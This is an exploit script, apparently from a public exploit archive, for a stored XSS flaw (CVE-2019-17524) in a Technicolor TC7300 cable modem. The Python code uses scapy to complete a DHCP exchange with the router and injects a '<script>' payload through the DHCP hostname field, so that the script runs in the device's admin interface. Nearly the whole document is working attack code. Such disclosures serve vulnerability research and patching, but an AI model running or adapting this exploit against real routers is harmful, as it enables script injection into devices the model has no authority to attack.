# Exploit Author: Luis Stefan
# Vendor Homepage: https://www.technicolor.com/
# Software Link: N/A
# Version: TC7300.B0 - STFA.51.20
# Tested on: macOS Mojave and Catalina
# CVE : 

#!/usr/bin/env python3
__author__ = "Luis Stefan"
__license__ = "MIT"
__version__ = "1.0"
__email__ = "luis.ss@protonmail.com"
__description__ = """CVE-2019-17524.py: This script is used to exploit a xss vulnerability found in a technicolor device."""

from enum import IntEnum
from scapy.all import *
import codecs, threading, time

# Define your network interface
interface = &#039;en0&#039;
# Insert your interface card mac address
mac = &#039;xx:xx:xx:xx:xx:xx&#039;
broadcast = &#039;ff:ff:ff:ff:ff:ff&#039;
mac_hxd = codecs.decode(mac.replace(&#039;:&#039;, &#039;&#039;),&#039;hex&#039;)

class Bootp(IntEnum):
    Discover = 1
    Offer = 2
    Request = 3
    Decline = 4
    Ack = 5
    Nak = 6
    Release = 7

def dhcp_discover():
    disc_pkt = Ether(src=mac, dst=broadcast) / \
        IP(src=&#039;0.0.0.0&#039;, dst=&#039;255.255.255.255&#039;) / \
        UDP(dport=67, sport=68) / BOOTP(chaddr=mac_hxd) / \
        DHCP(options=[(&#039;message-type&#039;, &#039;discover&#039;), &#039;end&#039;])
    sendp(disc_pkt, iface=interface)

def dhcp_request(pkt):
    yraddr = pkt[&#039;BOOTP&#039;].yraddr
    # gwaddr == Gateway Ip Address
    gwaddr = &#039;192.168.0.1&#039;
    param_req_list = []
    hostname = "<script>alert(&#039;XSS triggered&#039;)</script>"
    req_pkt = Ether(src=mac, dst=broadcast) / \
        IP(src=&#039;0.0.0.0&#039;, dst=&#039;255.255.255.255&#039;) / \
        UDP(dport=67, sport=68) / BOOTP(chaddr=mac_hxd) / \
        DHCP(options=[(&#039;message-type&#039;, &#039;request&#039;), (&#039;server_id&#039;, gwaddr),
                      (&#039;requested_addr&#039;, yraddr), (&#039;hostname&#039;, hostname), &#039;end&#039;])
    sendp(req_pkt, iface=interface)

def dhcp(pkt):
    print(pkt.display())
    print("#############################################################")
    if pkt.haslayer(DHCP) and pkt[&#039;DHCP&#039;].options[0][1] == Bootp.Offer:
        dhcp_request(pkt)
    elif pkt.haslayer(DHCP) and pkt[&#039;DHCP&#039;].options[0][1] == Bootp.Ack:
        print("Server Acknowledged")
        sys.exit(0)
    elif pkt.haslayer(DHCP) and pkt[&#039;DHCP&#039;].options[0][1] == Bootp.Decline:
        print("Server Declined")
        sys.exit(0)
    elif pkt.haslayer(DHCP) and pkt[&#039;DHCP&#039;].options[0][1] == Bootp.Nak:
        print("Server Nak")
        sys.exit(0)


def ver_dhcp():
    print("Verifying DHCP port traffic..")
    sniff(iface=interface, prn=dhcp, filter="port 68 and port 67", timeout=20)
    sys.exit(0)


def main():
    t1 = threading.Thread(target=ver_dhcp, args=())
    t1.setDaemon = True
    t1.start()
    time.sleep(2)
    dhcp_discover()


if __name__ == "__main__":
    main()

